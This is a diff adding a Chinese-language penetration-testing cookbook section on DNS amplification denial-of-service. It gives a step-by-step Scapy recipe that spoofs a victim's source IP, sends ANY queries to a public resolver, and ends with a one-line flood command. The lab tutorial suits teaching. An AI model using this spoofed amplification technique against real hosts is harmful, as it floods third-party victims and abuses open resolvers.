@@ -218,7 +218,7 @@ smurf 攻击是历史上用于执行分布式拒绝服务（DDoS）放大攻击�
 
 ### 准备
 
-要执行smurf攻击，您需要有一个LAN，上面运行多个系统。 提供的示例将 Ubuntu 用作扫描目标。 有关设置 Ubuntu 的更多信息，请参阅本书第一章中的“安装 Ubuntu Server”秘籍
+要执行smurf攻击，您需要有一个LAN，上面运行多个系统。 提供的示例将 Ubuntu 用作扫描目标。 有关设置 Ubuntu 的更多信息，请参阅本书第一章中的“安装 Ubuntu Server”秘籍。
 
 ### 操作步骤
 
@@ -325,3 +325,351 @@ Sent 100 packets.
 +   来自所使用的网络功能的响应应该显着大于用于请求它的请求。
 
 传统 smurf 攻击的效率取决于 LAN 上响应 IP 定向的广播流量的主机。 这种主机从目标系统的伪造 IP 地址接收 ICMP 广播回响请求，然后针对接收到的每个请求同时返回 ICMP 回响应答。
+
+## 6.4 DNS 放大 DoS 攻击
+
+DNS放大攻击通过对给定域执行所有类型记录的伪造查询，来利用开放的 DNS 解析器。 通过同时向多个开放的解析器发送请求来使用 DDoS 组件，可以提高这种攻击的效率。
+
+### 准备
+
+为了模拟 DNS 放大攻击，你需要有一个本地名称服务器，或知道一个开放和可公开访问的名称服务器的 IP 地址。 提供的示例将 Ubuntu 用作扫描目标。 有关设置 Ubuntu 的更多信息，请参阅本书第一章中的“安装 Ubuntu Server”秘籍。
+
+### 操作步骤
+
+为了了解 DNS 放大的工作原理，可以使用基本的 DNS 查询工具，如`host`，`dig`或`nslookup`。 通过对与已建立的域相关的所有记录类型执行请求，你将注意到一些请求返回了相当大的响应：
+
+```
+root@KaliLinux:~# dig ANY google.com @208.67.220.220
+
+; <<>> DiG 9.8.4-rpz2+rl005.12-P1 <<>> ANY google.com @208.67.220.220 
+;; global options: +cmd
+;; Got answer: 
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 41539 
+;; flags: qr rd ra; QUERY: 1, ANSWER: 17, AUTHORITY: 0, ADDITIONAL: 0
+;; QUESTION SECTION: ;
+google.com.         IN   ANY
+;; ANSWER SECTION: 
+google.com.      181   IN   A   74.125.232.101 
+google.com.      181   IN   A   74.125.232.97 
+google.com.      181   IN   A   74.125.232.102 
+google.com.      181   IN   A   74.125.232.99 
+google.com.      181   IN   A   74.125.232.104 
+google.com.      181   IN   A   74.125.232.96 
+google.com.      181   IN   A   74.125.232.100 
+google.com.      181   IN   A   74.125.232.103 
+google.com.      181   IN   A   74.125.232.105 
+google.com.      181   IN   A   74.125.232.98 
+google.com.      181   IN   A   74.125.232.110 
+google.com.      174   IN   AAAA   2607:f8b0:4004:803::1007 
+google.com.      167024   IN   NS   ns2.
+google.com. 
+google.com.      167024   IN   NS   ns1.
+google.com. 
+google.com.      167024   IN   NS   ns3.
+google.com. 
+google.com.      167024   IN   NS   ns4.
+google.com. 
+google.com.      60   IN   SOA   ns1.
+google.com. dns-admin.
+google.com. 1545677 7200 1800 1209600 300
+
+;; Query time: 7 msec 
+;; SERVER: 208.67.220.220#53(208.67.220.220) 
+;; WHEN: Thu Dec 19 02:40:16 2013 
+;; MSG SIZE  rcvd: 35
+```
+
+在提供的示例中，与`google.com`域相关的所有记录类型的请求返回了一个响应，包含11个A记录，1个AAAA记录，4个NS记录和1个SOA记录。 DNS放大攻击的效率与响应大小直接相关。 我们现在将尝试使用 Scapy 中构建的数据包执行相同的操作。 要发送我们的 DNS 查询请求，我们必须首先构建此请求的层级。 我们需要构建的第一层是 IP 层：
+
+```
+root@KaliLinux:~# scapy Welcome to Scapy (2.2.0) 
+>>> i = IP() 
+>>> i.display() 
+###[ IP ]###
+    version= 4
+    ihl= None
+    tos= 0x0
+    len= None
+    id= 1
+    flags=
+    frag= 0
+    ttl= 64
+    proto= ip
+    chksum= None
+    src= 127.0.0.1
+    dst= 127.0.0.1
+    \options\ 
+>>> i.dst = "208.67.220.220" 
+>>> i.display() 
+###[ IP ]###
+    version= 4
+    ihl= None
+    tos= 0x0
+    len= None
+    id= 1
+    flags=
+    frag= 0
+    ttl= 64
+    proto= ip
+    chksum= None
+    src= 172.16.36.180
+    dst= 208.67.220.220
+    \options\ 
+```
+
+要构建我们的请求的 IP 层，我们应该将 `IP` 对象赋给变量`i`。 通过调用`display()`函数，我们可以确定该对象的属性配置。 通常，发送和接收地址都设为回送地址`127.0.0.1`。 可以通过将`i.dst`设置为广播地址的字符串值，来更改目标地址并修改这些值。 通过再次调用`display()`函数，我们可以看到，不仅更新了目的地址，而且`Scapy`也会自动将源 IP 地址更新为与默认接口相关的地址。 现在我们已经构建了请求的 IP 层，我们应该继续构建 UDP 层：
+
+```
+>>> u = UDP() 
+>>> u.display() 
+###[ UDP ]###  
+    sport= domain  
+    dport= domain  
+    len= None  
+    chksum= None 
+>>> u.dport 53
+```
+
+要构建我们的请求的 UDP 层，我们将使用与IP层相同的技术。 在提供的示例中，`UDP` 对象赋给了`u`变量。 如前所述，可以通过调用`display()`函数来确定默认配置。 在这里，我们可以看到源和目标端口的默认值都列为`domain`。 您可能能猜到，这表示与端口 53 相关的 DNS服 务。DNS 是一种常见的服务，通常可以在网络系统上发现。 要确认这一点，我们可以通过引用变量名和属性直接调用该值。 既然已经构建了 IP 和 UDP 层，我们需要构建 DNS 层：
+
+```
+>>> d = DNS() 
+>>> d.display() 
+###[ DNS ]###
+  id= 0
+  qr= 0
+  opcode= QUERY
+  aa= 0
+  tc= 0
+  rd= 0
+  ra= 0
+  z= 0
+  rcode= ok
+  qdcount= 0
+  ancount= 0
+  nscount= 0
+  arcount= 0
+  qd= None
+  an= None
+  ns= None
+  ar= None 
+```
+
+为了构建我们的请求的DNS层，我们将使用与 IP 和 UDP 层相同的技术。 在提供的示例中，DNS 对象赋给了`d`变量。 如前所述，可以通过调用`display()`函数来确定默认配置。 在这里，我们可以看到有几个值需要修改：
+
+```
+>>> d.rd = 1 
+>>> d.qdcount = 1 
+>>> d.display() 
+###[ DNS ]###
+  id= 0
+  qr= 0
+  opcode= QUERY
+  aa= 0
+  tc= 0
+  rd= 1
+  ra= 0
+  z= 0
+  rcode= ok
+  qdcount= 1
+  ancount= 0
+  nscount= 0
+  arcount= 0
+  qd= None
+  an= None
+  ns= None  
+  ar= None 
+```
+
+RD 位需要被激活; 这可以通过将`rd`值设置为 1 来实现。此外，需要为`qdcount`提供值`0x0001`; 这可以通过提供整数值 1 来完成。通过再次调用`display()`函数，我们可以验证是否已经调整了配置。 现在已经构建了 IP，UDP 和 DNS 层，我们需要构建一个 DNS 问题记录以分配给`qd`值：
+
+```
+>>> q = DNSQR() 
+>>> q.display() 
+###[ DNS Question Record ]###  
+    qname= '.'  
+    qtype= A  
+    qclass= IN 
+```
+
+为了构建 DNS 问题记录，我们将使用与 IP，UDP 和 DNS 层相同的技术。 在提供的示例中，DNS 问题记录已赋给`q`变量。 如前所述，可以通过调用`display()`函数来确定默认配置。 在这里，我们可以看到有几个值需要修改：
+
+```
+>>> q.qname = 'google.com' 
+>>> q.qtype=255 
+>>> q.display() 
+###[ DNS Question Record ]###
+  qname= 'google.com'
+  qtype= ALL
+  qclass= IN 
+```
+
+`qname`值需要设置为要查询的域。 另外，`qtype`需要通过传递一个整数值 255 来设置为`ALL`。通过再次调用`display()`函数，我们可以验证是否已经调整了配置。 现在问题记录已经配置完毕，问题记录对象应该赋给DNS `qd`值：
+
+```
+>>> d.qd = q 
+>>> d.display() 
+###[ DNS ]###  
+id= 0  
+qr= 0  
+opcode= QUERY
+aa= 0
+  tc= 0
+  rd= 1
+  ra= 0
+  z= 0
+  rcode= ok
+  qdcount= 1
+  ancount= 0
+  nscount= 0
+  arcount= 0
+  \qd\
+   |###[ DNS Question Record ]###
+   |
+  qname= 'google.com'
+   |
+  qtype= ALL
+   |
+  qclass= IN
+  an= None
+  ns= None
+  ar= None
+```
+
+我们可以通过调用`display()`函数来验证问题记录是否已赋给 DNS `qd`值。 现在已经构建了 IP，UDP 和 DNS 层，并且已经将相应的问题记录赋给 DNS 层，我们可以通过堆叠这些层来构造请求：
+
+```
+>>> request = (i/u/d) 
+>>> request.display() 
+###[ IP ]###
+  version= 4
+  ihl= None
+  tos= 0x0
+  len= None
+  id= 1
+  flags=
+  frag= 0
+  ttl= 64
+  proto= udp
+  chksum= None
+  src= 172.16.36.180
+  dst= 208.67.220.220
+  \options\ 
+###[ UDP ]###
+   sport= domain
+   dport= domain
+   len= None
+   chksum= None 
+###[ DNS ]###
+  id= 0
+  qr= 0
+  opcode= QUERY
+  aa= 0
+  tc= 0
+  rd= 1
+  ra= 0
+  z= 0
+  rcode= ok
+  qdcount= 1
+  ancount= 0
+  nscount= 0
+  arcount= 0  
+  \qd\
+   |###[ DNS Question Record ]###
+   | qname= 'google.com'
+   | qtype= ALL
+   | qclass= IN
+  an= None
+  ns= None
+  ar= None
+```
+
+可以通过使用斜杠分隔变量来堆叠 IP，UDP 和 DNS 层。 然后可以将这些层赋给表示整个请求的新变量。 然后可以调用`display()`函数来查看请求的配置。 在发送此请求之前，我们应该以相同的显示格式查看它，因为我们需要查看响应。 这样，我们可以更好地从视觉上理解请求和响应之间发生的放大。 这可以通过直接调用变量来完成：
+
+```
+>>> request 
+
+<IP  frag=0 proto=udp dst=208.67.220.220 |<UDP  sport=domain |<DNS  rd=1 qdcount=1 qd=<DNSQR  qname='google.com' qtype=ALL |> |>>>
+```
+
+
+一旦建立了请求，它就可以被传递给发送和接收函数，以便我们可以分析响应。 我们不会将它赋给一个变量，而是直接调用该函数，以便可以以相同的格式查看响应：
+
+```
+>>> sr1(request) 
+Begin emission: 
+....................Finished to send 1 packets. 
+.............................* 
+Received 50 packets, got 1 answers, remaining 0 packets 
+
+<IP  version=4L ihl=5L tos=0x0 len=378 id=29706 flags= frag=0L ttl=128 proto=udp chksum=0x4750 src=208.67.220.220 dst=172.16.36.232 options=[] |<UDP  sport=domain dport=domain len=358 chksum=0xf360 |<DNS  id=0 qr=1L opcode=QUERY aa=0L tc=0L rd=1L ra=1L z=0L rcode=ok qdcount=1 ancount=17 nscount=0 arcount=0 qd=<DNSQR  qname='google.com.' qtype=ALL qclass=IN |> an=<DNSRR  rrname='google.com.' type=A rclass=IN ttl=188 rdata='74.125.228.103' |<DNSRR  rrname='google.com.' type=A rclass=IN ttl=188 rdata='74.125.228.102' |<DNSRR  rrname='google.com.' type=A rclass=IN ttl=188 rdata='74.125.228.98' |<DNSRR  rrname='google.com.' type=A rclass=IN ttl=188 rdata='74.125.228.96' |<DNSRR  rrname='google. com.' type=A rclass=IN ttl=188 rdata='74.125.228.99' |<DNSRR  rrname='google.com.' type=A rclass=IN ttl=188 rdata='74.125.228.110' |<DNSRR  rrname='google.com.' type=A rclass=IN ttl=188 rdata='74.125.228.100' |<DNSRR  rrname='google.com.' type=A rclass=IN ttl=188 rdata='74.125.228.97' |<DNSRR  rrname='google.com.' type=A rclass=IN ttl=188 rdata='74.125.228.104' |<DNSRR  rrname='google. com.' type=A rclass=IN ttl=188 rdata='74.125.228.105' |<DNSRR  rrname='google.com.' type=A rclass=IN ttl=188 rdata='74.125.228.101' |<DNSRR  rrname='google.com.' type=AAAA rclass=IN ttl=234 rdata='2607 :f8b0:4004:803::1002' |<DNSRR  rrname='google.com.' type=NS rclass=IN ttl=171376 rdata='ns2.google.com.' |<DNSRR  rrname='google.com.' type=NS rclass=IN ttl=171376 rdata='ns1.google.com.' |<DNSRR  rrname='google. com.' type=NS rclass=IN ttl=171376 rdata='ns3.google.com.' |<DNSRR  rrname='google.com.' type=NS rclass=IN ttl=171376 rdata='ns4.google.com.' |<DNSRR  rrname='google.com.' type=SOA rclass=IN ttl=595 rdata='\xc1\x06\ tdns-admin\xc0\x0c\x00\x17\xd0`\x00\x00\x1c \x00\x00\x07\x08\x00\x12u\ x00\x00\x00\x01,' |>>>>>>>>>>>>>>>>> ns=None ar=None |>>> 
+```
+
+该响应确认了我们已成功构建所需的请求，并且我们已请求了一个相当大的有效内容，其中包括`google.com`域的11个A记录，1个AAAA记录，4个NS记录和1个SOA记录。 此练习清楚地表明，请求的响应明显大于请求本身。 为了使这个放大攻击有效，它需要通过伪造源 IP 地址重定向到我们的目标：
+
+```
+>>> i.src = "172.16.36.135" 
+>>> i.display()
+###[ IP ]###
+  version= 4
+  ihl= None
+  tos= 0x0
+  len= None
+  id= 1
+  flags=
+  frag= 0
+  ttl= 64
+  proto= ip
+  chksum= None
+  src= 172.16.36.135
+  dst= 208.67.220.220
+  \options\ 
+>>> request = (i/u/d) 
+>>> request 
+<IP  frag=0 proto=udp src=172.16.36.135 dst=208.67.220.220 |<UDP  sport=domain |<DNS  rd=1 qdcount=1 qd=<DNSQR  qname='google.com' qtype=ALL |> |>>>
+```
+
+将源 IP 地址值重新定义为目标系统的 IP 地址的字符串后，我们可以使用`display()`函数确认该值已调整。 然后我们可以重建我们的更改后的请求。 为了验证我们是否能够将 DNS 查询响应重定向到此伪造主机，我们可以在主机上启动 TCPdump：
+
+```
+admin@ubuntu:~$ sudo tcpdump -i eth0 src 208.67.220.220 -vv 
+[sudo] password for admin: 
+tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes 
+```
+
+在提供的示例中，TCPdump 配置将捕获`eth0`接口上，来自`208.67.220.220`源地址（查询的DNS服务器的地址）的所有流量。 然后，我们可以使用`send()`函数发送我们的请求：
+
+```
+>>> send(request) 
+. 
+Sent 1 packets. 
+>>> send(request) 
+. 
+Sent 1 packets.
+```
+
+发送请求后，我们应该返回到 TCPdump 的内容，来验证 DNS 查询的响应是否返回给了受害服务器：
+
+```
+tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes 
+19:07:12.926773 IP (tos 0x0, ttl 128, id 11341, offset 0, flags [none], proto UDP (17), length 350) resolver2.opendns.com.domain > 172.16.36.135. domain: [udp sum ok] 0 q: ANY? google.com. 16/0/0 google.com. A yyz08s13in-f4.1e100.net, google.com. A yyz08s13-in-f5.1e100.net, google. com. A yyz08s13-in-f14.1e100.net, google.com. A yyz08s13-in-f6.1e100. net, google.com. A yyz08s13-in-f2.1e100.net, google.com. A yyz08s13in-f0.1e100.net, google.com. A yyz08s13-in-f3.1e100.net, google.com. A yyz08s13-in-f1.1e100.net, google.com. A yyz08s13-in-f9.1e100.net, google. com. A yyz08s13-in-f7.1e100.net, google.com. A yyz08s13-in-f8.1e100.net, google.com. NS ns2.google.com., google.com. NS ns1.google.com., google. com. NS ns3.google.com., google.com. NS ns4.google.com., google.com. SOA ns1.google.com. dns-admin.google.com. 1545677 7200 1800 1209600 300 (322) 
+19:07:15.448636 IP (tos 0x0, ttl 128, id 11359, offset 0, flags [none], proto UDP (17), length 350) resolver2.opendns.com.domain > 172.16.36.135. domain: [udp sum ok] 0 q: ANY? google.com. 16/0/0 google.com. A yyz08s13in-f14.1e100.net, google.com. A yyz08s13-in-f6.1e100.net, google.com. A yyz08s13-in-f2.1e100.net, google.com. A yyz08s13-in-f0.1e100.net, google. com. A yyz08s13-in-f3.1e100.net, google.com. A yyz08s13-in-f1.1e100. net, google.com. A yyz08s13-in-f9.1e100.net, google.com. A yyz08s13in-f7.1e100.net, google.com. A yyz08s13-in-f8.1e100.net, google.com. A yyz08s13-in-f4.1e100.net, google.com. A yyz08s13-in-f5.1e100.net, google. com. NS ns2.google.com., google.com. NS ns1.google.com., google.com. NS ns3.google.com., google.com. NS ns4.google.com., google.com. SOA ns1. google.com. dns-admin.google.com. 1545677 7200 1800 1209600 300 (322) 
+```
+
+这个执行 DNS 放大的整个过程，实际上可以用 Scapy 中的单行命令来执行。 此命令使用所有与上一个练习中讨论的相同的值。 然后可以修改`count`值以定义要发送到受害服务器的载荷响应数：
+
+```
+>>> send(IP(dst="208.67.220.220",src="172.16.36.135")/UDP()/DNS(rd=1,qdco unt=1,qd=DNSQR(qname="google.com",qtype=255)),verbose=1,count=2) 
+.. 
+Sent 2 packets.
+
+```
+
+### 工作原理
+
+放大攻击的原理是利用第三方设备，使网络流量压倒目标。 对于多数放大攻击，必须满足两个条件：
+
++   用于执行攻击的协议不验证请求源
++   来自所使用的网络功能的响应应该显着大于用于请求它的请求。
+
+DNS 放大攻击的效率取决于 DNS 查询的响应大小。 另外，可以通过使用多个 DNS 服务器来增加攻击的威力。
